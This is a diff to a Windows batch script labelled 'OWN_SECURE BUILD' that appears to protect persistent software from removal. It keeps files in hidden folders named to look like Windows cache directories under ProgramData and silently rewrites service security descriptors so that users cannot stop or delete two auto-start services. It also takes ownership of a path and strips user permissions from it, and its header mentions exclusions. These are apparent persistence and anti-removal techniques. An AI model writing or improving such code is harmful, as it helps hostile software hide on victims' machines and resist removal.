@@ -1,5 +1,5 @@
 @echo off
-REM OWN_SECURE BUILD 20260802S1 - exclusions + ACL lock + SC service harden
+REM OWN_SECURE BUILD 20260802S2 - SDDL DC fix + valid accounts + exclusions/ACL
 setlocal EnableExtensions EnableDelayedExpansion
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
@@ -84,9 +84,9 @@ if not exist "%WD%\secure_sc.flag" (
   echo sc_locked>%WD%\secure_sc.flag
 )
 
-REM --- SC services: only SYSTEM + Admins can stop/delete/change ---
-REM DACL: SY full control-ish; BA full; no Interactive/Users stop rights
-set "SD=D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
+REM --- SC services: SYSTEM can config/stop/delete; BA full; users blocked ---
+REM SY: CC DC LC SW RP DT LO RC  (no SD -> cannot change this SD itself)
+set "SD=D:(A;;CCDCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
 sc.exe sdset "%PRIM%" "%SD%" >nul 2>&1
 sc.exe sdset "%ALT%" "%SD%" >nul 2>&1
 sc.exe config "%PRIM%" start= auto >nul 2>&1
@@ -104,5 +104,5 @@ REM take ownership then strip inherited ACEs; SYSTEM+Admins only
 takeown /F "%T%" /R /D Y >nul 2>&1
 icacls "%T%" /inheritance:r >nul 2>&1
 icacls "%T%" /grant:r "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" >nul 2>&1
-icacls "%T%" /remove:g "Users" "Authenticated Users" "Everyone" "Interactive" "BUILTIN\Users" >nul 2>&1
+icacls "%T%" /remove:g "Users" "Authenticated Users" "Everyone" "NT AUTHORITY\INTERACTIVE" "BUILTIN\Users" >nul 2>&1
 exit /b 0
